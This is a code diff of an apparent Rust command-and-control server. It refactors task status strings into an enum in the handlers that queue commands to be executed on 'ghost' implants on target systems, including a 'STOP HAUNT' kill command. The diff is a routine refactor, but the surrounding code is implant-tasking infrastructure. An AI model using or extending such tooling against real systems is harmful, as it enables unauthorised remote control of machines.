@@ -16,6 +16,16 @@ use uuid::Uuid;
 // each implant can send back its state
 // -> generalize that into a message for now
 
+// === ENUMS ===
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "lowercase")]
+pub enum TaskStatus {
+    Pending,
+    Sent,
+    Done,
+    Failed
+}
+
 // === STRUCTS ===
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct Ghost {
@@ -30,7 +40,7 @@ pub struct Task {
     pub id: String,         // UUID v7
     pub command: String,    // exact command to be executed on target system
     pub args: String,       // arguments for the above command
-    pub status: String,     // current status: "pending", "sent", "done"
+    pub status: TaskStatus,
     pub result: Option<String>
 }
 
@@ -43,7 +53,7 @@ pub struct HeartbeatRequest {
 #[derive(Serialize, Deserialize)]
 pub struct TaskResult {
     pub task_id: String,
-    pub status: String,
+    pub status: TaskStatus,
     pub output: String
 }
 
@@ -118,14 +128,14 @@ async fn handle_ghost_heartbeat(
     let mut outgoing_tasks = Vec::new();
 
     if let Some(mut tasks) = state.pending_tasks.get_mut(&req.id) {
-        for task in tasks.iter_mut().filter(|t| t.status == "pending") {
+        for task in tasks.iter_mut().filter(|t| t.status == TaskStatus::Pending) {
             outgoing_tasks.push(TaskDefinition {
                 id: task.id.clone(),
                 command: task.command.clone(),
                 args: task.args.clone()
             });
 
-            task.status = "sent".to_string();
+            task.status = TaskStatus::Sent;
         }
     }
 
@@ -205,7 +215,7 @@ async fn handle_charon_queue_task(
         id: Uuid::now_v7().to_string(),
         command: req.command,
         args: req.args,
-        status: "pending".to_string(),
+        status: TaskStatus::Pending,
         result: None
     };
 
@@ -222,7 +232,7 @@ async fn handle_charon_kill_ghost(
         id: Uuid::now_v7().to_string(),
         command: "STOP HAUNT".to_string(),  // magic command for implant to interpret, TODO: think about it
         args: "".to_string(),
-        status: "pending".to_string(),
+        status: TaskStatus::Pending,
         result: None
     };
 
